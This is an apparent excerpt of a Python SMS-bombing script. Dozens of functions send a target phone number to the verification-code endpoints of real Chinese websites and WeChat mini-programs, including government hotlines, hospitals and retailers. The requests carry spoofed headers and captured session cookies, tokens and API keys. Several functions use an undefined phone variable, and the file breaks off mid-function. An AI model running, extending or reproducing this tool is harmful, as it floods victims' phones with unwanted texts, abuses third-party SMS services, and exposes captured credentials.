def send_request12(phone):
    """请求12: 凡知平台"""
    url = 'https://api.fanzhi.cn/common/security/message/send'
    headers = {
        'Host': 'api.fanzhi.cn',
        'gw-session-id': 'ne7ws46a',
        'gw-request-scene-type': 'wxapp',
        'gw-request-organize-id': '32545',
        'gw-request-mini-app-id': 'wx5b5871639c529aeb',
        'gw-request-shop-id': '653621',
        'content-type': 'application/json;charset=utf-8'
    }
    data = {"type": "sms", "val": f"86+{phone}", "from": "c-login", "validate": {"captcha": "dolore"}}
    try:
        requests.post(url, headers=headers, json=data, timeout=5)
        return True
    except:
        return False

def send_request13(phone):
    """请求13: 爱聚诊"""
    url = 'https://www.aijuzhen.com.cn/user/sendValidCode'
    headers = {
        'Host': 'www.aijuzhen.com.cn',
        'Connection': 'keep-alive',
        'charset': 'utf-8',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; V2002A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340153 MMWEBSDK/20240404 MMWEBID/5568 MicroMessenger/Lite Luggage/4.2.2 QQ/9.2.5.28755 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
        'content-type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip,compress,br,deflate',
        'Referer': 'https://servicewechat.com/wx2649509cb80f2d0e/1/page-frame.html'
    }
    data = {'userNameType': '1', 'userName': phone, 'pfAppType': '3003', 'oemInstitutionNo': '422863'}
    try:
        requests.post(url, headers=headers, data=data, timeout=10)
        return True
    except:
        return False

def send_request14(phone):
    """请求14: SOHO中国"""
    url = 'https://www.sohochinaoffice.com/api/vpublic/sms/send'
    headers = {
        'Host': 'www.sohochinaoffice.com',
        'Connection': 'keep-alive',
        'Accept': 'application/json, text/plain, */*',
        'xweb_xhr': '1',
        'X-Requested-With': 'XMLHttpRequest',
        'Cookie': 'acw_tc=b65cfd3b17365814882984990e5597abfcb6a4670a24c6837e4ae0424fc03a; SERVERID=cd790e86ab36d7aeaa540053e806f51f|1736581541|1736581488; soho_lang=zch',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'Content-Type': 'application/json',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wx6cfaabec28e23bdb/106/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    params = {'mobile': phone, 'currtime': '1736581543', 'sign': '5346ae7ab6d8b8c7f2af25f0e753424d'}
    try:
        requests.get(url, headers=headers, params=params, timeout=10)
        return True
    except:
        return False

def send_request15(phone):
    """请求15: 万方家装"""
    url = 'https://api.wfjec.com/mall/user/sendRegisterSms'
    headers = {
        'Host': 'api.wfjec.com',
        'Connection': 'keep-alive',
        'Content-Length': '24',
        'wuhash': 'oyimt5AAwbh-HGJsmHZ5iUkUdaRg',
        'xweb_xhr': '1',
        'locale': 'zh_CN',
        'appid': 'wxf9cbb6c11bdbef46',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'Content-Type': 'application/json;charset=UTF-8',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wxf9cbb6c11bdbef46/129/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data = {'mobile': phone}
    try:
        requests.put(url, headers=headers, json=data)
        return True
    except:
        return False

def send_request16(phone):
    """请求16: 娇诗迪美妆"""
    url = "http://mservers.jsdbeauty.cn/api/Beauty/GetVerificationCode"
    headers = {"Content-Type": "application/json"}
    data = {
        "androidid": "63e1445725d5d202",
        "chanleid": 60017,
        "imei": "590e02770eb93eb0c3d160a6d94920f6",
        "model": "V2403A",
        "packagename": "com.wodk.bdbeauty",
        "pkey": "c7a6cc267056cb5164127e5424ff5f68",
        "uniqueid": "wpp813f5eo7lf0sk1755475785798",
        "username": phone,
        "vercode": 477
    }
    try:
        requests.post(url, headers=headers, json=data, timeout=10)
        return True
    except:
        return False

def send_request17(phone):
    """请求17: 泉州政务服务"""
    url = f'https://qzzwfw.quanzhou.gov.cn/appoint/api/sms/send?phoneNumber={phone}&type=1'
    headers = {
        'Host': 'qzzwfw.quanzhou.gov.cn',
        'Connection': 'keep-alive',
        'charset': 'utf-8',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; V2002A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340153 MMWEBSDK/20240404 MMWEBID/5568 MicroMessenger/Lite Luggage/4.2.2 QQ/9.2.5.28755 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
        'content-type': 'application/json',
        'Accept-Encoding': 'gzip,compress,br,deflate',
        'token': '',
        'Referer': 'https://servicewechat.com/wx49fa0ef86cd772d9/23/page-frame.html'
    }
    try:
        requests.post(url, headers=headers, timeout=10)
        return True
    except:
        return False
def request_url27(phone):
    url27 = "https://data.mijiaoyu.cn/assist2/corFilter/sysMessage"
    headers27 = {
        "Host": "data.mijiaoyu.cn",
        "Origin": "https://raas.mijiaoyu.cn",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Accept-Language": "zh-cn",
        "Referer": "https://raas.mijiaoyu.cn/firstScreening?channel=6103",
        "Accept-Encoding": "gzip, deflate, br"
    }
    params1 = {
        "mobile": phone
    }
    try:
        requests.get(url27, headers=headers27, params=params1, timeout=5)
    finally:
        update_progress()

def request_url28(phone):
    url28 = "https://mpc-user.airdoc.com/api/user/verify"
    headers28 = {
        "Host": "mpc-user.airdoc.com",
        "Connection": "keep-alive",
        "Cookie": "ht_fantastic=767215ede05ae51d475caab2d9525e6f;SERVERID=393feef84b4a4ff9be5e4dace3bbbc40|1716829998|1716829998",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxf3b2aeae80f906df/63/page-frame.html"
    }
    data28 = {
        "phone": phone
    }
    try:
        requests.post(url28, headers=headers28, json=data28, timeout=5)
    finally:
        update_progress()

def request_url29(phone):
    url29 = "https://m.shhzcj.com/cors-api/v1/sms"
    headers29 = {
        "Host": "m.shhzcj.com",
        "Origin": "https://m.shhzcj.com",
        "Cookie": "Hm_lpvt_640b3388cd34b0a14c8cfa4565280070=1716832579; Hm_lvt_640b3388cd34b0a14c8cfa4565280070=1716832579; acw_tc=ac11000117168325795627845ead538d3329c16d2139a8ce5c443a6c69b5c5; aliyungf_tc=33def20077e8569c96091789bd1cd73e05072d3a6b49b90aaa9188b66a7a549b",
        "Content-Length": "0",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Accept-Language": "zh-cn",
        "Referer": "https://m.shhzcj.com/vue/login/dist/",
        "Accept-Encoding": "gzip, deflate, br"
    }
    params2 = {
        "mobileNum": phone,
        "smsType": 2
    }
    try:
        requests.post(url29, headers=headers29, params=params2, timeout=5)
    finally:
        update_progress()

def request_url30(phone):
    url30 = "https://csswechat.jomoo.cn/index.php?g=Datement&m=Index&a=sendcode"
    headers30 = {
        "Host": "csswechat.jomoo.cn",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "zh-cn",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://csswechat.jomoo.cn",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Connection": "keep-alive",
        "Referer": "https://csswechat.jomoo.cn/index.php?g=Datement&m=Index&a=editMobile",
        "Cookie": "HWWAFSESID=da3c2731d1c7ee1821; HWWAFSESTIME=1716834047198; PHPSESSID=abp3gqcgf9k6keeojg37qtmp6h"
    }
    data30 = {
        "phone": phone,
        "scene": 1
    }
    try:
        requests.post(url30, headers=headers30, data=data30, timeout=5)
    finally:
        update_progress()

def request_url31(phone):
    url31 = "https://zxh.fesco.com.cn/api/user/GetVerFicationCode"
    headers31 = {
        "Connection": "keep-alive",
        "Content-Length": "24",
        "token": "",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx61be4d55a292f888/34/page-frame.html"
    }
    data31 = {
        "sPhone": phone
    }
    try:
        requests.post(url31, headers=headers31, data=json.dumps(data31), timeout=5)
    finally:
        update_progress()

def request_url32(phone):
    url32 = f"https://app-services.lynkco.com.cn/auth/mp/uc/send-Sms?mobile={phone}&appId=wx4e8c1172fe132106"
    headers32 = {
        "Host": "app-services.lynkco.com.cn",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx4e8c1172fe132106/137/page-frame.html"
    }
    try:
        requests.get(url32, headers=headers32, timeout=5)
    finally:
        update_progress()

def request_url33(phone):
    url33 = "https://www.zara.cn/itxrest/1/user/store/11716/verify/send-code?languageId=-7"
    headers33 = {
        "Host": "www.zara.cn",
        "Connection": "keep-alive",
        "Content-Length": "64",
        "userId": "100244384616",
        "WCTrustedToken": "100244384616%2C4UYAa2GLqpdYnL5Z5lJbJ%2FHjnA1F6zZuL2%2BRGaeHRus%3D",
        "content-type": "application/json",
        "ITX-APPID": "ZaraWechat wxd95a72c5f595b6a3",
        "Cookie": "ITXSESSIONID=c1076db6b72f27282f2f2d20462ceea5;ITXDEVICEID=d4ec87e4df3cd8d99a40c20fc50c10d4;IDROSTA=65c777aa54c9:33601498f437adb3ef68b41a5;JSESSIONID=0000ls95QiCH5x5XR3a68DGnDJH:3aa4aakdv;_abck=F42F5663795ECD8041588D8427772F85~-1~YAAQDgWK3jYdtbiPAQAAkuARvQtNeAGfVPahJQuxjiq71/GrHo18nky+w7S/y1yYp90B2Vab8lFwGbJSr5rGJIRadCJDGyIc+1copqEiapH/XNpN2P/ZvBL5jlOra0GhIgWAqp7KktNf4zcGWV5R/YTGllMtB+e7qKonShIKfCvSCMnzWbBqB6YWBGndWPmwDQjWxq4bkUTU4oSsewWVcdpe1xvt8WD/zazZJU/S32a9wkpVcu+Ub9ok3JcEPCm5t0k0d4h/Mnk0uFM5ff2of3pW0+FaWCXh+wlBUlkhh95sks2lwgMb9GWFJQeweXKEpyhg1M6fJwmdwk+W30w9rIusW1zfxxXIgZ06iHkWF0ZH0E2s7vmd7O8~-1~-1~-1;bm_sz=28F98D70B54712C79BDDE53D3E6C586F~YAAQDgWK3jcdtbiPAQAAkuARvRfOaT2iK5rebC7uF3CHUIJ/p3PoF/V/Ofu6D22SefSqm1MOtE89ycotVNU+XcDQR46kFBsX1Vv9clCvmgbQPBHpRoWzj/+qYPov+hDRV19HP3IPf6DCfyX2TQhKuM6J8o19TLHMGUXfNvTE8TlnzzbbqnGUMomUvsIWHJw5edWYtlNl2aF6wTmqVj9IBrfglQyxdKhQlIqGhEOhOM1suzHPSncdVfikADRjDRmvC/Hk8ev8rzyoGbf+iWkTR6WKqznHjIi6lSegmrKeAsLeW8WrmcrUJcNYX+pRVBikbh7Gpgbj+q7dwDbfmIE9Hh1ozBvwexKtOsFfYE8;__mgjuuid=338277ad-e04f-4eaf-881d-73bcd1febd42",
        "WCToken": "100244384616%2CNRdxgTAUTlYoFlE0CYfgci6DF4nFs8SrQX9Fwv49mPJmVfjUTaybcpL5mUaEUKeFmDjqeR1bJ5rzJSKnkoBVdT9Uuwwl3OAdXJvj5bEw9krKlTKOld1IhDDSsFotn9DHzeuBJzJTPNswnks0zVA%2BcFLLKDPKSd1%2F56nYvpmNOGN81UeAyGpG%2FnUaP8QjH89wVB7ybDhBg9sOy3wmzX8BJwMO2YQUedmb53wnCRmrcOKQr6vABJAJKkLg6SAvBYa1",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxd95a72c5f595b6a3/342/page-frame.html"
    }
    data33 = {
        "phone": {
            "countryCode": "+86",
            "subscriberNumber": phone
        }
    }

    response33 = requests.post(url33, headers=headers33, data=json.dumps(data33))

def request_url35():
    url35 = "https://biz.xilaigong.com/api/auth/sendCode/" + phone
    headers35 = {
        "Host": "biz.xilaigong.com",
        "Connection": "keep-alive",
        "Content-Length": "28",
        "content-type": "application/x-www-form-urlencoded",
        "source": "0",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxc6cf695b87515ecf/167/page-frame.html"
    }
    data35 = {
        "phone": phone,
        "tenantId": 1
    }

    response35 = requests.post(url35, headers=headers35, data=data35)

def request_url36():
    url36 = "https://passport.csdn.net/v1/login/sendVerifyCode"
    headers36 = {
    "Host": "passport.csdn.net",
    "Accept": "application/json, text/plain, */*",
    "X-Requested-With": "XMLHttpRequest",
    "Sec-Fetch-Site": "same-origin",
    "Accept-Language": "zh-CN,zh-Hans;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Sec-Fetch-Mode": "cors",
    "Content-Type": "application/json;charset=utf-8",
    "Origin": "https://passport.csdn.net",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
}
    data36 = {
    "code": "0086",
    "mobile": phone,  
    "platform": "WAP",
    "type": "popupLogin",
    "spm": "1001.2101.3001.7902",
}

    response36 = requests.post(url36, json=data36, headers=headers36)

def request_url37():
    url37 = "https://app.zwfw.nmg.gov.cn/webrest/rest/nmcheckcode/getCheckCode"
    headers37 = {
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "https://app.zwfw.nmg.gov.cn",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x1800312f) NetType/WIFI Language/zh_CN",
    "Referer": "https://app.zwfw.nmg.gov.cn/webrest/h5/wechat.m7.12345standard.baotou/pages/login/register.html?openId=oXtQf5o9niOMybyZZwo-nXW8niZQ",
    "Content-Length": "46",
    "Accept-Language": "zh-CN,zh-Hans;q=0.9"
}
    data37 = {
    "token": "",
    "params": {
        "mobile": phone
    }
}

    response37 = requests.post(url37, json=data37, headers=headers37)

def request_url38():
    url38 = "http://12345.sp.nanning.gov.cn/api/consulting/users/send_rand"
    headers38 = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh-Hans;q=0.9",
    "Content-Type": "application/json",
    "Origin": "http://12345.sp.nanning.gov.cn",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x1800312f) NetType/WIFI Language/zh_CN",
    "Connection": "keep-alive",
    "Referer": "http://12345.sp.nanning.gov.cn/h5/?code=091e0Ekl2GGwwd4mQLkl2de5NS3e0EkI&state=13",
    "Content-Length": "80",
    "Cookie": "PHPSESSID=jknq1ivn985untokbljrjdoqg8; d2d977c58444271d9c780187e93f80e5=think%3A%7B%22verify_code%22%3A%2273a0885eaf581ec9d7913c111598adb1%22%2C%22verify_time%22%3A%221716889403%22%7D"
}
    data38 = {
    "mid": "13",
    "userkey": "451c1496131ad35cbe06718e6e42fcb1",
    "mobile": phone
}

    response38 = requests.post(url38, json=data38, headers=headers38)

def request_url39():
    url39 = "https://jx12345.jixi.gov.cn/auth/sendCode"
    headers39 = {
    "Connection": "keep-alive",
    "Content-Length": "37",
    "content-type": "application/x-www-form-urlencoded",
    "Access-Token": "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJvQ21oRzVOZVUtRFQzckZJdUlYLWNDT3gydmdzIiwibWluaW9wZW5pZCI6Im9DbWhHNU5lVS1EVDNyRkl1SVgtY0NPeDJ2Z3MiLCJzZXNzaW9uX2tleSI6Imd2RjRJUVBNSHVMeGpmL2xIOGIxRFE9PSIsInBhcmFtcyI6e30sImV4cCI6MTcxNjk3NjkzNywibWluaXVuaW9uaWQiOiJvTDRXczU1eTI5cUZ4ckRVUU1keWFhRWw1RE00IiwicmVnaXN0ZXIiOmZhbHNlLCJzdGF0dXMiOiIwIn0.O-JPtzhiUTghZ3coJM_6XJ5rrYCvJcCa5WyZj0UjNodYJIazFXYith4D4Yr34uVdPYHSIoVPWHe2CY2zSaJkbg",
    "Accept-Encoding": "gzip,compress,br,deflate",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x1800312f) NetType/WIFI Language/zh_CN",
    "Referer": "https://servicewechat.com/wx4343bdbf05b22095/6/page-frame.html"
}
    data39 = {
    "phoneNumber": phone,
    "type": "register"
}

    response39 = requests.post(url39, data=data39, headers=headers39)

def request_url40():
    url40 = "https://yqcx.hk12345.cn/hksztel/wxapi/weixin/doMessage"
    headers40 = {
    "Connection": "keep-alive",
    "Content-Length": "28",
    "miniOpenid": "oxYx75cCtigIuoYRvx5wtzgQVouI",
    "content-type": "application/x-www-form-urlencoded",
    "source": "9891",
    "openid": "oYGX_6iS7k4kU3RBqz5IBTk4l1XA",
    "Accept-Encoding": "gzip,compress,br,deflate",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
    "Referer": "https://servicewechat.com/wx3c36d5597feb3835/25/page-frame.html"
}
    data40 = {
    "phone": phone,
    "scene": "bind"
}

    response40 = requests.post(url40, data=data40, headers=headers40)

def request_url41():
    url41 = "http://www.hf12345.vip/wx/sms/sendValidateSms"
    headers41 = {
    "Accept": "application/json",
    "X-Requested-With": "XMLHttpRequest",
    "Accept-Language": "zh-cn",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://www.hf12345.vip",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
    "Connection": "keep-alive",
    "Referer": "http://www.hf12345.vip/weixinPublic/wx9c0b6e09161a60eb/toRegister",
    "Content-Length": "42",
    "Cookie": "JSESSIONID=F5D3AADB25BDD789CF3FBA78CFD4626A"
}
    data41 = {
    "appid": "wx9c0b6e09161a60eb",
    "phone": phone
}

    response = requests.post(url41, data=data41, headers=headers41)

def request_url42():
    url42 = "https://www.dzmyy.com.cn/Applet/Main/MobileVerification"
    headers42 = {
    "Host": "www.dzmyy.com.cn",
    "Connection": "keep-alive",
    "Content-Length": "53",
    "content-type": "application/json",
    "ReturnActionName": "/Applet/Main/MobileNumber",
    "Version": "1",
    "ReturnUrl": "%2Fpages%2Fmine%2Findex",
    "Channel": "wxapp",
    "ViewTypeId": "",
    "AppletPage": "pages%2Flogon%2Fmobile%2Findex",
    "RequestDate": "20240528192542",
    "AppletPath": "%2Fpages%2Flogon%2Fmobile%2Findex%3FreturnUrl%3D",
    "OpenId": "o5tLq5INEPr0Boj7SuTH4aJjZ_Uw",
    "Authorization": "edb4aed7-9b3b-43cf-aebf-2c90d563c8dd",
    "ReturnCode": "1",
    "EncUser": "08B7BAD5CF433EAC",
    "ReturnMethod": "POST|GET",
    "EncryptedData": "3ff645a165edfd2ec1cf21257c1d11de",
    "ReturnControllerName": "",
    "Accept-Encoding": "gzip,compress,br,deflate",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
    "Referer": "https://servicewechat.com/wx1b61780b5404fc5c/13/page-frame.html"
}
    data42 = {
    "mobileNumber": phone,
    "activationKeyType": 33
}

    response42 = requests.post(url42, headers=headers42, data=json.dumps(data42))

def request_url43():
    url43 = "https://gateway.swifthealth.cn/patient/v1/usercenter/unauth/pat-verificationcode"
    headers43 = {
    "Host": "gateway.swifthealth.cn",
    "Connection": "keep-alive",
    "X-Hos-Id": "52010000",
    "Request-No": "APP171689709309814950",
    "X-Api-Ver": "2.23.0",
    "content-type": "application/json",
    "X-Api-Key": "gc8U4S37ZhhoQZNeZZ0CfUCNJaKgVYqsOUJ6Uo0KugXuMKJh2SqrYOqyx8THN3nm7BvLkiEeWLxQK8WA7GYMxRSnf9pc2XalGiAUb2P0UMgXzK9WfR0kI8H05ftz59Dvy0jPlR11FtpgIgivbjGjNG9KO1ZBdRrZVNs1LtuWxI9eK2HYV0FT9ALBrg5vxmc5FdILBlqJxP/xBCRXk0DdfSgIgP4D5PIbRAEQ5V7BKnjc6MAaie9XgD2kxPpEjaR0X+jXWvO3hZw/XgLTmRw1mA==",
    "X-TRAFFIC": "7",
    "Accept-Encoding": "gzip,compress,br,deflate",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
    "Referer": "https://servicewechat.com/wxe6bac0e49b82a99c/13/page-frame.html"
}
    params3 = {"phone": phone}

    response43 = requests.get(url43, headers=headers43, params=params3)

def request_url44():
    url44 = "https://niuzhigongzuo.com/weapp/sms/sendCode2"
    headers44 = {
    "Content-Type": "application/json",
    "Cookie": "SESSION=6b92bf28-d22e-469d-ab8d-dbf61a39f17f",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
    "Referer": "https://servicewechat.com/wx7b49cec380f049ab/167/page-frame.html"
}
    data44 = {
    "mobile": phone,
    "captchaKey": "57517028-d9c3-4b75-815b-2bf3c84b0f8a",
    "xCoordinates": "2344",
    "token": "123456",
    "appId": "ksdDFioalj_889lsfkjd",
    "version": "1.5.0",
    "sign": "a43ca2f2e474fc52026db65fbb3926a7",
    "timestamp": "1716975620449",
    "deviceId": "lyZk-NJgH-iPhone-iPhone11<iPhone12,1>-iOS14.7",
    "customerId": "0",
    "platform": "weapp"
}

    response44 = requests.post(url44, json=data44, headers=headers44)

def request_url45():
    url45 = "https://api.gsyzkj.cn/index.php?s=/addon/DuoguanUser/CardApi/sendPhoneVerifyCode.html"
    data45 = {
    "phone": phone,
    "utoken": "1d3eba17451e1749540a9e7a98134f9b",
    "token": "gh_e2b06d6285be"
}
    headers45 = {
    "Content-Type": "application/x-www-form-urlencoded",
    "client": "XCX",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
    "Referer": "https://servicewechat.com/wx013c1563101b8fcc/2/page-frame.html"
}

    response45 = requests.post(url45, data=data45, headers=headers45)

def request_url46():
    url46 = "https://kh.yto.net.cn/steward/weixin/login/getGraphicsInfo"
    headers46 = {
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003131) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxd45424c7e8133f43/55/page-frame.html"
    }
    data46 = {"userMobile": phone}

    response46 = requests.post(url46, json=data46, headers=headers46)

def request_url47():
    url47 = "https://www.es12345.cn/es12345/api/dispatch/wxmini/getRandomNum/" + phone
    headers47 = {
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003131) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx12c462fe5920b1e2/6/page-frame.html"
    }
    data47 = {
        "phoneNumber": phone,
        "name": "",
        "openid": "o-e1Y5SnfUPZ-Te5ybsdCGY-qClo",
        "cusSex": 1,
        "cusType": 1
    }

    response47 = requests.post(url47, json=data47, headers=headers47)

def request_url48():
    url48 = "https://ga.sczwfw.gov.cn/app/api/security/smscode/get"
    headers48 = {
        "Host": "ga.sczwfw.gov.cn",
        "Connection": "keep-alive",
        "Content-Length": "22",
        "accesseId": "apifordcjt",
        "timeStamp": "20240530",
        "randomNum": "12345",
        "usertoken": "undefined",
        "content-type": "application/x-www-form-urlencoded",
        "apptoken": "33a2270453b5ee9ee9cd3756d2a8b355",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003131) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx35a9d032155c4766/55/page-frame.html"
    }
    data48 = {
        "phoneNumer": phone
    }

    response48 = requests.post(url48, headers=headers48, data=data48)

def request_url49():
    url49 = "https://pzh12345.cn/cns-bmfw-webrest/rest/cnssmssend/getSmsVerify"
    headers49 = {
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "text/html;charset=utf-8",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx76b107968ba82f65/4/page-frame.html"
    }
    data49 = {
        "phonenumber": phone,
        "sendType": "case"
    }

    response49 = requests.post(url49, headers=headers49, data=json.dumps(data49))

def request_url50():
    url50 = "https://ga.sczwfw.gov.cn/app/api/security/smscode/get"
    headers50 = {
        "Host": "ga.sczwfw.gov.cn",
        "Connection": "keep-alive",
        "Content-Length": "22",
        "accesseId": "apifordcjt",
        "timeStamp": "20240530",
        "randomNum": "12345",
        "usertoken": "undefined",
        "content-type": "application/x-www-form-urlencoded",
        "apptoken": "33a2270453b5ee9ee9cd3756d2a8b355",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003131) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx35a9d032155c4766/55/page-frame.html"
    }
    data50 = {
        "phoneNumer": phone
    }

    response50 = requests.post(url50, headers=headers50, data=data50)

def request_url51():
    url51 = "https://www.12345hbsz.com/szbmfwwxrest/rest/userInfo/getVerifiCode"
